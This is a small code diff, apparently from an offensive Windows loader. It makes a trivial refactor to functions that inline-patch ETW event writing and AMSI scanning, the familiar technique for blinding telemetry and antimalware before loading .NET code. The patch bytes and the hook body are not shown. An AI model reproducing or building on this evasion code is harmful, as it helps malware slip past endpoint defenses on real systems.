@@ -463,7 +463,7 @@ BOOL PatchEtw()
 	// Add address of hook function to patch.
 	*(DWORD64*)&uHook[2] = (DWORD64)MyEtwEventWrite;
 
-	return InlinePatch(lpFuncAddress, &uHook[0],sizeof(uHook));
+	return InlinePatch(lpFuncAddress, uHook,sizeof(uHook));
 }
 
 BOOL PatchAmsi()
@@ -483,7 +483,7 @@ BOOL PatchAmsi()
 		return -2;
 	}
 
-	return InlinePatch(addr, &amsipatch[0], sizeof(amsipatch));
+	return InlinePatch(addr, amsipatch, sizeof(amsipatch));
 }
 
 BOOL ClrIsLoaded(LPCWSTR version, IEnumUnknown* pEnumerator, LPVOID * pRuntimeInfo) {
